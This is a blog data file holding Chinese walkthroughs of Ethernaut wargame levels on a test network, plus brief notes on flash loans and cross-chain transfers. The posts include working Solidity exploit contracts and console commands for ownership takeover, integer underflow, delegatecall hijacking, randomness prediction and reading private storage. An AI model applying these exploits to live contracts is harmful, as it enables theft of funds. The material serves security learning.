{"meta":{"title":"KW's blog","subtitle":"博客副标题","description":"博客描述","author":"KW","url":"https://kdlwtrdrgm.github.io","root":"/"},"pages":[{"title":"404","date":"2021-07-20T10:58:45.428Z","updated":"2021-07-20T10:58:45.428Z","comments":true,"path":"404/index.html","permalink":"https://kdlwtrdrgm.github.io/404/index.html","excerpt":"","text":"页面未找到！"}],"posts":[{"title":"未命名","slug":"test","date":"2021-08-02T08:43:59.000Z","updated":"2021-08-02T08:59:05.447Z","comments":true,"path":"/未分类/test/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E6%9C%AA%E5%88%86%E7%B1%BB/test/","excerpt":"","text":"f 发生的撒地方阿斯顿","categories":[{"name":"未分类","slug":"未分类","permalink":"https://kdlwtrdrgm.github.io/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/"}],"tags":[]},{"title":"Hello Ethernaut第0关练习","slug":"0.Ethernaut-Hello Ethernaut","date":"2021-07-27T09:17:00.000Z","updated":"2021-08-02T08:27:30.394Z","comments":true,"path":"/Ethernaut/0.Ethernaut-Hello Ethernaut/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/0.Ethernaut-Hello%20Ethernaut/","excerpt":"","text":"Hello Ethernaut第0关练习要求：熟悉关卡，另有一个熟悉代码的教程：CryptoZombies 合约代码：无 游戏基础教学：题目上有详细步骤， 通过谷歌浏览器下载meta mask插件，按照他的步骤设置meta mask钱包，记住当时的助记码，使用rinbeby网络 通过水龙头获取一些测试币，ethernaut游戏是rinkeby网络这个 faucet。获取的流程是通过推特发送一个条含有你钱包的地址的推特然后将推特的链接复制下来粘贴到水龙头网站上，（完成整个游戏大概只需要10eth，因为是测试币，多了没用）如图： 3、然后按F12打开开发者工具中的控制台，输入player,回车 4、这些功能都可以看一下做一下： player//玩家地址 getBalance(player)//玩家余额 help()//帮助文档 instance或contract.address()//合约地址 await ethernaut.owner//部署合约的所有者，我们常用await让代码更简洁直观，下图有对比 await contract.abi//查看他的应用二进制接口有哪些 5、见面关是有题目的 我们按照步骤走 6、付gas费，有时候可能会因为网络问题导致比较慢，耐心点等， 7、这样就算是完成交易了，浏览器会有弹窗，confirmed就代表交易成功， 8、点击提交实例，再付一次gas费，就可以看到，这一关就结束了，下一关","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Fall Out第1关练习","slug":"1.Ethernaut-Fallback","date":"2021-07-26T10:55:00.000Z","updated":"2021-08-02T08:27:30.395Z","comments":true,"path":"/Ethernaut/1.Ethernaut-Fallback/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/1.Ethernaut-Fallback/","excerpt":"","text":"Fall out第1关练习要求：仔细查看下面的合约代码。 你会打败这个级别，如果 您声称拥有合同的所有权 您将其余额减少到 0 可能有帮助的事情 与 ABI 交互时如何发送以太币 如何在 ABI 之外发送以太币 wei/ether 单位之间的相互转换 - 参见 help() 命令 - 回退方法 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Fallback { //Fallback合约继承自Ownable合约 using SafeMath for uint256; mapping(address =&gt; uint) public contributions; //通过映射,可以使用地址获取贡献的值 address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); }//构造函数设置合约创建者的贡献值为1000以太币 modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function contribute() public payable { require(msg.value &lt; 0.001 ether);//每次贡献的值小于0.001以太币 contributions[msg.sender] += msg.value;//累计起来 if(contributions[msg.sender] &gt; contributions[owner]) { owner = msg.sender; }//当你贡献的值大于1000的时候就你成为合约所有者 } function getContribution() public view returns (uint) { return contributions[msg.sender]; }//获取你的贡献值 function withdraw() public onlyOwner { owner.transfer(address(this).balance); }//onlyOwner修饰,所以只有合约所有者才能用来提款 fallback() external payable { require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);//判断金额与贡献值是否大于零 owner = msg.sender;//msg.sender就是调用者,也就是我们 //执行这一条语句owner就成了我们 } } 合约分析：合约构造函数 Fallback() 中初始化拥有者贡献度为 1000 ether。我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。但在 contribute() 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。 那应该怎么办呢？这里是重入攻击的关键，同时也是The DAO事件里黑客所用到的攻击。 思路：首先贡献一点金额，来通过 require 触发 fallback 函数，来成为合约的所有者，然后 withdraw 函数转走合约中的所有钱 可以参考官网对fallback的描述 fallback 函数被调用的情况有两种 调用合约中不存在的函数 当合约收到以太币（没有任何数据） 此外，为了接收以太币，fallback 函数必须标记为 payable。 也就是说想要满足题目要求，先成为owner，这里能够做到 fallback() external payable { require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);//判断金额与贡献值是否大于零 owner = msg.sender;//msg.sender就是调用者,也就是我们 //执行这一条语句owner就成了我们 } 其实成为 owner 还有另一种方式，我们仔细看合约的 fallback 函数，即最下方的无名函数。当合约账户收到一笔转账时会自动调用 fallback 函数。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。要满足contributions[msg.sender]&gt;0首先需要通过contribute函数给到contributions[msg.sender]1wei,这里可以了解一下help()相关的信息 可以了解下wei和ether， 第二个要求，通过withdraw函数将来实现 function withdraw() public onlyOwner { owner.transfer(address(this).balance); }//onlyOwner修饰,所以只有合约所有者才能用来提款 接下来进入实例吧 攻击流程：1、点击获取新实例，meta mask提交gas以后在控制台，查看以下信息，玩家地址，合约地址，实例余额，合约拥有者，（注意：每支付完一笔gas费都要稍等片刻，等待交易） 2、要满足题目要求contributions[msg.sender]&gt;0我们使用 contract.contribute({value: 1}) 3、上面就完成了第一步，接着我们触发fallback函数，触发 fallback 函数的条件： 当调用一个不存在的函数的时候 发送没有数据的纯 ether 时 contract.sendTransaction({value: 1}) 楼上说了当合约账户收到一笔转账时会自动调用 fallback 函数， 这时候合约收到了2wei，合约余额是2wei，触发了fallback函数，owner变成了我们自己，就是msg.sender。 4、第二个要求，使用了withdraw使用了transfer()函数实现 contract.withdraw() 这时候目标完成，快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Fall Back第2关练习","slug":"2.Ethernaut-Fall out","date":"2021-07-26T08:31:00.000Z","updated":"2021-08-02T08:27:30.402Z","comments":true,"path":"/Ethernaut/2.Ethernaut-Fall out/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/2.Ethernaut-Fall%20out/","excerpt":"","text":"Fall back第2关练习要求： 您声称拥有合同的所有权 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; } } 合约分析： 我们可以发现一个很明显的问题，理论上应该写成 Fallout 的构造函数被写成了 Fal1out ，那么该函数就不是构造函数，意味着该函数可以被我们调用（我们无法调用构造函数）。 并且可以看见owner = msg.sender，直接达到我们的目的，所以直接调用查看owner即可 await contract.Fal1out()//调用Fal1out()函数 await contract.owner()//查看当前合约拥有者 攻击流程：1、获取新实例 2、查看玩家地址，合约地址，查看一下合约拥有者 3、调用Fal1out()函数，付gas费，查看当前合约拥有者已变成我们玩家自己 4、快乐提交去吧","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Coin Flip第3关练习","slug":"3.Ethernaut-Coin Filp","date":"2021-07-26T05:40:00.000Z","updated":"2021-08-02T08:27:30.404Z","comments":true,"path":"/Ethernaut/3.Ethernaut-Coin Filp/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/3.Ethernaut-Coin%20Filp/","excerpt":"","text":"Coin Flip第3关练习要求： 这是一个掷硬币游戏，你需要通过猜测掷硬币的结果来建立你的连胜记录。要完成这一关，你需要使用你的心理能力连续10次猜测正确的结果。 合约代码：pragma solidity ^0.4.18; import 'openzeppelin-solidity/contracts/math/SafeMath.sol'; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins;//连胜次数 uint256 lastHash;//上一个hash uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; //这个数是2^255 function CoinFlip() public { consecutiveWins = 0; }//构造函数，每次开始把赢的次数归零 function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(block.blockhash(block.number.sub(1))); //blockValue等于前一个区块的hash值转换成uint256,block.number是当前区块数,减一就是上一个了 if (lastHash == blockValue) { revert();//如果最后的hash等于计算出来的 }//中止执行并将所做的更改还原为执行前状态 lastHash = blockValue;//改成上个区块的hash值为这个区块的 uint256 coinFlip = blockValue.div(FACTOR); //coinFlip等于blockValue除以FACTOR,而FACTOR换成256的二进制就是最左位是0，右边全是1 //因为除法运算会取整,所以coinFlip由blockValue的最高位决定 bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++;//如果我们猜的跟他算出来的一样的话连胜次数加一 return true; } else { consecutiveWins = 0;//否则归零 return false; } } } 合约分析：我们来考虑一下，应该怎么实现攻击，首先，我们已经知道他的算法是怎么样的了，而且它用来计算的东西我们同样可以找到，所以，我们完全可以先进行计算，把结果在给他发过去就好啦 exp 如下，把 exp 代码复制到 remix IDE 中，部署 exploit 合约（要用之前得到的那个合约地址） pragma solidity ^0.4.18; import './SafeMath.sol'; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins;//连胜次数 uint256 lastHash;//上一个hash uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; //这个数是2^255 function CoinFlip() public { consecutiveWins = 0; }//构造函数，每次开始把赢的次数归零 function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(block.blockhash(block.number.sub(1))); //blockValue等于前一个区块的hash值转换成uint256,block.number是当前区块数,减一就是上一个了 if (lastHash == blockValue) { revert();//如果最后的hash等于计算出来的 }//中止执行并将所做的更改还原为执行前状态 lastHash = blockValue;//改成上个区块的hash值为这个区块的 uint256 coinFlip = blockValue.div(FACTOR); //coinFlip等于blockValue除以FACTOR,而FACTOR换成256的二进制就是最左位是0，右边全是1 //因为除法运算会取整,所以coinFlip由blockValue的最高位决定 bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++;//如果我们猜的跟他算出来的一样的话连胜次数加一 return true; } else { consecutiveWins = 0;//否则归零 return false; } } } contract attack{ uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; CoinFlip expFlip = CoinFlip(0x199fc78CC3057E5199184E8099C92E481d119f7a); //这表示已经有一个CoinFlip合约部署在了这个地址 function pwn() public{ uint256 blockValue = uint256(block.blockhash(block.number-1)); uint256 coinFlip = blockValue /FACTOR; bool side = coinFlip == 1 ? true : false; expFlip.flip(side); } } 常用的SafeMath.sol也可以贴一下 //SafeMath.sol pragma solidity ^0.4.18; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b &lt;= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c &gt;= a); return c; } } 攻击流程：1、点击“Get new Instance”来获取一个实例。然后拿到合约的地址以及 consecutiveWins 的值 2、在 http://remix.ethereum.org 部署我们的合约，先新建一个workspaces自己命名然后再其contracts目录下（也可以自己新建文件夹）新建两个sol文件并命名，将上面代码复制过去 将solidity版本修改成为一样的0.4.18版本 compile绿色黄色说明是小问题，红色需要找到报错的代码进行对应的修改，进行deploy，注意图中的Injected Web3，对应的CONTRACT,再点击Deploy,付gas费，稍等片刻成功以后会看到下面出现一个pwn函数 3、点击pwn，付gas费，不要急，慢慢等成功 可以再console中检查一下是否成功，有1次了，说明成功了，我们执行到10次，记住不要急，一个一个慢慢来 4、钱包里面可以看到状态 我们这里是失败了一次，没关系我们继续pwn，gaslimit也可以自己调整一个合适的值，要比钱包活动中pwn的数量大一些， 有时候默认的燃料不够会导致失败，我们就设置成50000就没问题 5、直到数值变成10，我们就可以提交实例了","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Telephone第4关练习","slug":"4.Ethernaut-Telephone","date":"2021-07-24T03:33:00.000Z","updated":"2021-08-02T08:27:30.405Z","comments":true,"path":"/Ethernaut/4.Ethernaut-Telephone/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/4.Ethernaut-Telephone/","excerpt":"","text":"Telephone第4关练习要求： 获取合约的权限 合约分析：观察合约，我们的目的是要获取合约的权限，所以观察合约中是否有owner = msg.sender。发现一处是在构造函数中，把owner赋值给合约的创建者，检查构造函数没有问题。接下来我们查看changeOwner函数中的if (tx.origin != msg.sender) ,其中tx.origin表示最初交易发起人，msg.sender表示消息的发起人,举个栗子： 假设这样一条调用链：A -&gt; B -&gt; C -&gt; D，其中D 的 msg.sender 是 C，其 tx.origin 为 A。 如果在同一个合约中使用的话，他们tx.origin=msg.sender，如果在多合约的情况下，比如用户A通过合约来调用B合约，那么对于B合约来说，msg.sender就是合约A，tx.origin是用户，实际使用中，应该避免使用tx.origin(1,之后可能被废弃2，容易引发安全问题) 所以只要tx.origin不等于msg.sender，我们就可以调用changeOwner替换掉owner，所以构造这样一个合约： pragma solidity ^0.5.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } contract exp{ Telephone a = Telephone(输入你的实例地址); function hack() public{ a.changeOwner(msg.sender); } } 攻击流程：1、点击“Get new Instance”来获取一个实例。 2、输入contract.address来获取合约地址，用输出的合约地址替换以下合约中的地址在remix中编译合约： pragma solidity ^0.5.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } contract exp{ Telephone a = Telephone(0x66be5c7AD850F3742A727fA0Ac35258831b437B5); function hack() public{ a.changeOwner(msg.sender); } } 点击hack稍等片刻，查看原合约中的owner的地址： 提交，收获胜利","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"闪电贷攻防和智能合约审计","slug":"闪电贷攻防与智能合约审计","date":"2021-07-23T09:35:57.465Z","updated":"2021-08-02T08:27:30.409Z","comments":true,"path":"/区块链/闪电贷攻防与智能合约审计/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%97%AA%E7%94%B5%E8%B4%B7%E6%94%BB%E9%98%B2%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"闪电贷攻防和智能合约审计什么是闪电贷 本身是一个很好的金融创新，必须在智能合约中操作，原子性，最小单位执行，不成功就失败，要么成功要么失败 闪电贷和闪电兑 闪电贷AAVE项目 闪电兑函数UniswapV2项目 乐观转账 区别在于data参数有没有变化 闪电贷攻击事件分析闪电贷攻击防范建议智能合约审计","categories":[{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"跨链与侧链","slug":"Ethernaut-波卡和COMCOS","date":"2021-07-23T09:01:15.613Z","updated":"2021-08-02T08:27:30.408Z","comments":true,"path":"/区块链/Ethernaut-波卡和COMCOS/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E5%8C%BA%E5%9D%97%E9%93%BE/Ethernaut-%E6%B3%A2%E5%8D%A1%E5%92%8CCOMCOS/","excerpt":"","text":"跨链与侧链跨链简单的说跨链就是解决如何把一个条链上的Token转移到另外一条链上。本质上是一套链与链之间的清算机制，清算的本质就是精准记账。 为什么要跨链? 1、不同链上的资产交换 2、多个场景打通的token互兑 3、跨越多个区块链网络达成的智能合约 4、一条链上资产被抵押或者锁定，能否用于抵押另一条链上的商品与服务，这需要实现链之间的通信与确认 如何实现跨链 1、分布式私钥控制 2、用侧链&amp;中继链 3、公证人模式 4、哈希锁定模式","categories":[{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"Token第5关练习","slug":"5.Ethernaut-Token","date":"2021-07-23T07:27:00.000Z","updated":"2021-08-02T08:27:30.406Z","comments":true,"path":"/Ethernaut/5.Ethernaut-Token/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/5.Ethernaut-Token/","excerpt":"","text":"Token第5关练习要求： 首先会给你20个token，想办法去获得更多的Token! 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token { mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; }//构造函数,在一开始给合约一些钱 function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0);//先检查调用者的余额是不是大于转账金额 balances[msg.sender] -= _value;//调用的人减金额_value balances[_to] += _value;//给目标增加金额_value return true; }//转账 function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }//查询余额 } 合约分析：可以看到两个函数，一个是transfer，一个是balanceOf,构造函数定义了totalSupply。可控点是address,value。在transfer函数中有一处”require“校验，此处可以通过”整数下溢“来绕过检查，同时这里的balances和value都是无符号整数，以加减法为例，在 Solidity 中 (2**256 - 1) + 1 = 0 ， 0 - 1 = 2**256 - 1 。目标合约中如果我们传入的 value 大于 20，则 balances[msg.sender] - _value 会溢出变成极大数，如此可以顺利通过 require 检验，并使得发送者获得天量代币。 攻击流程：1、点击“Get new Instance”来获取一个实例。 2、查看初始化玩家的token数量，玩家地址 3、输入 这时候发生了一个情况rinkeby网络出现拥堵，存在一些问题无法使用，于是我们转到remix上进行 将代码复制到remix中点击 initialSupply输入20点击Deploy 查看到存在的Token为20，输入transfer中参数，输入其他任意地址和21，即可产生整数溢出，点击transfer,查看balanceOf 在网的话就顺利提交即可 好的亲爱的朋友们，可能是我的metamask钱包卡住了，我们尝试重设一下钱包，继续试试吧 get new instance后查看余额，输入contract.transfer(“0x8E27dCd7218F2C673A01Aa432707eBA771E6cb9E”,21) 直接输入可能会报错，可能是存在编译上的问题，我们加上引号就行。 确认以后查看balanceOf，开启代币土豪生涯","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Delegation第6关练习","slug":"6.Ethernaut-Delegation","date":"2021-07-23T03:19:00.000Z","updated":"2021-08-02T08:27:30.406Z","comments":true,"path":"/Ethernaut/6.Ethernaut-Delegation/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/6.Ethernaut-Delegation/","excerpt":"","text":"Delegation第6关练习要求： 此级别的目标是让您声明对所给实例的所有权。 可能有帮助的事情 查看 Solidity 关于低级函数的文档，它是如何工作的，它如何用于将操作委托给链上库，以及它对执行范围有什么影响。delegatecall 回退方法 方法 ID 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; }//构造函数 function pwn() public { owner = msg.sender; }//如果能调用这个pwn函数就可以了 } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress);//把合约给实例化了 owner = msg.sender; } fallback() external { (bool result, bytes memory data) = address(delegate).delegatecall(msg.data); if (result) { this; }//fallback函数,其中的delegatecall跟call的区别在于 //前者所调用的函数在本合约中执行的,其他的信息都是自己合约的,相当于把函数拷贝到当前合约来执行 } } 合约分析：三种调用函数 在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式 以下是 Solidity 中 call 函数簇的调用模型： &lt;address&gt;.call(...) returns (bool) &lt;address&gt;.callcode(...) returns (bool) &lt;address&gt;.delegatecall(...) returns (bool) 这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。 在函数调用的过程中， Solidity 中的内置变量 msg 会随着调用的发起而改变，msg 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。 三种调用方式的异同点 call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。 delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。 callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。 在这里我们看到了两个合约，Delegate初始化时将传入的address设定为合约的owner，下面一个pwn函数也引起我们的注意，从名字也能看出挺关键的。之后下面的Delegation合约则实例化了上面的Delegate合约，其fallback函数使用了delegatecall来调用其中的delegate合约，而这里的delegatecall就是问题的关键所在。我们经常会使用call函数与合约进行交互，对合约发送数据，当然，call是一个较底层的接口，我们经常会把它封装在其他函数里使用，不过性质是差不多的，这里用到的delegatecall跟call主要的不同在于通过delegatecall调用的目标地址的代码要在当前合约的环境中执行，也就是说它的函数执行在被调用合约部分其实只用到了它的代码，所以这个函数主要是方便我们使用存在其他地方的函数，也是模块化代码的一种方法，然而这也很容易遭到破坏。当前上下文中进行执行，但是在 msg.sender 和 msg.value 的指向上却有差异。 在这里我们要做的就是使用delegatecall调用delegate合约的pwn函数，这里就涉及到使用call指定调用函数的操作，当你给call传入的第一个参数是四个字节时，那么合约就会默认这四个自己就是你要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，函数前面就是带有括号括起来的参数类型列表的函数名称。 经过上面的简要分析，问题就变很简单了，sha3我们可以直接通过web3.sha3来调用，而delegatecall在fallback函数里，我们得想办法来触发它，前面已经提到有两种方法来触发，但是这里我们需要让delegatecall使用我们发送的data，所以这里我们直接用封装好的sendTransaction来发送data，其实到了这里我也知道了前面fallback那关我们也可以使用这个方式来触发fallback函数： 观察题目我们可以发现 Delegation 的 fallback 函数会使用 delegatecall 调用 Delegate 合约，而 Delegate 合约中的 pwn() 函数就是用来修改 owner 的。因此我们只需要向 Delegation 合约发送一笔 msg.data 为 pwn() 函数签名的交易即可： 攻击流程：1、get net instance，查看玩家地址，合约地址，合约所有者 2、输入代码发现编译上存在问题修改一下为web.utils.sha3(\"pwn()\"); 3、现在再查看owner 拿到，提交成功 这里给大家几个建议： call、callcode、delegatecall调用的自由度极大，并且 call 会发生 msg 值的改变，需要谨慎的使用这些底层的函数；同时在使用时，需要对调用的合约地址、可调用的函数做严格的限制。 call 与 callcode 调用会改变 msg 的值，会修改 msg.sender 为调用者合约的地址，所以在合约中不能轻易将合约本身的地址作为可信地址。 delegatecall 与 callcode 会拷贝目标代码到自己的环境中执行，所以调用的函数应该做严格的限制，避开调用任意函数的隐患。 智能合约在部署前必须通过严格的审计和测试。","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Force第7关练习","slug":"7.Ethernaut-Force","date":"2021-07-22T17:49:00.000Z","updated":"2021-08-02T08:27:30.407Z","comments":true,"path":"/Ethernaut/7.Ethernaut-Force/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/7.Ethernaut-Force/","excerpt":"","text":"Force第7关练习要求： 让合约的balance比0多 合约代码：pragma solidity ^0.4.18; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */} 合约分析：有趣有趣真有趣，一个猫咪的空合约？ 经过查看资料，发现在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点，这里确实是比较有趣了。那么接下来就非常简单了，我们只需要创建一个合约并存点eth进去然后调用selfdestruct将合约里的eth发送给我们的目标合约就行了。 攻击流程：1、拿取目标信息 2、在remix中插入攻击代码 // SPDX-License-Identifier: MIT pragma solidity ^0.4.20; contract Force { function Force() public payable {} function exploit(address _target) public { selfdestruct(_target); } } 这里需要注意版本，1wei，合约地址 exploit后 成功 4、提交胜利","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Vault第8关练习","slug":"8.Ethernaut-Vault","date":"2021-07-21T10:22:00.000Z","updated":"2021-08-02T08:27:30.407Z","comments":true,"path":"/Ethernaut/8.Ethernaut-Vault/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/8.Ethernaut-Vault/","excerpt":"","text":"Vault第8关练习要求： 解锁金库以通过关卡！ 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Vault { bool public locked; bytes32 private password;//定义了一个密码 constructor(bytes32 _password) public { locked = true;//构造函数,locked为true password = _password;//定义了一个password } function unlock(bytes32 _password) public { if (password == _password) { locked = false;//如果输入的密码正确就可以解锁 } } } 合约分析：从合约外如何读取私有变量 要求是令 locked = false , 其实就是要我们猜测 password 的值， 这里有个细节不论是 private 变量还是 public 变量都是会存储在区块链上的，就是说依然是公开的。 这里通过getStorageAt函数来访问它，getStorageAt函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置position，它是按照变量声明的顺序从0开始，顺次加1，不过对于mapping这样的复杂类型，position的值就没那么简单了。至于web3.js有新的学习任务了，参考链接：web3.js 教程 攻击流程：1、查看到他的合约地址通过web3.eth.getStorageAt拿到他的password，位置是在[1] 2、先将他进行Ascii解码，注意这里web3可能会用到web3.utils.hexToAscii或者web.utils.toAscii，通过alert或者console.info 的将他输出出来 web3.eth.getStorageAt(contract.address, 1,function(x,y){alert(web3.utils.hexToAscii(y))}) web3.eth.getStorageAt(contract.address, 1,function(x,y){console.info(web3.utils.toAscii(y))}) 3、最后，解锁，查看解锁状态 4、且慢，还有另一种方式， let password = await web3.eth.getStorageAt(instance, 1) contract.unlock(password) 赋值解锁效率更快 5、快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"King第9关练习","slug":"9.Ethernaut-King","date":"2021-07-21T08:52:00.000Z","updated":"2021-08-02T08:27:30.408Z","comments":true,"path":"/Ethernaut/9.Ethernaut-King/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/9.Ethernaut-King/","excerpt":"","text":"King第9关练习要求： 给合约转钱，钱比上一个国王多就可以成为新的国王，过关条件是成为永久的国王。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender;//构造函数,king是创建者 prize = msg.value;//prize是创建者发送的金额 } fallback() external payable { require(msg.value &gt;= prize || msg.sender == owner);//要求发送的金额大于等于king的金额或发送者是合约拥有着 king.transfer(msg.value);//把的转账给目前的king king = msg.sender;//king变成msg.sender prize = msg.value;//prize是现在这个king发送的金额数 } function _king() public view returns (address payable) { return king; } } 合约分析：观察合约可以知道，当 King 